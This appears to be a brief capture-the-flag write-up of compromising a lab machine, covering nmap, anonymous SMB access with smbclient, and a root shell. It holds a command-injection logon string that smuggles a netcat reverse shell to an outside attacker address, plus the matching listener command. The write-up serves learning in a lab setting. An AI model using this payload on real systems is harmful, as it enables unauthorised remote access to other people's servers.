Status: PWNED!

First I did nmap and noticed smb ports open
I enumed for shares and found tmp with anonymous login 
I went in using
smbclient //10.10.10.3/tmp
I created a reverse shell using 
logon " /=`nc '10.10.14.194' 4444 -e /bin/bash`"
I listened using 
nc -nlvp 4444
This gave me all access
in the root directory I found the root flag in root.txt
in the /home/makis directory I found the user flag
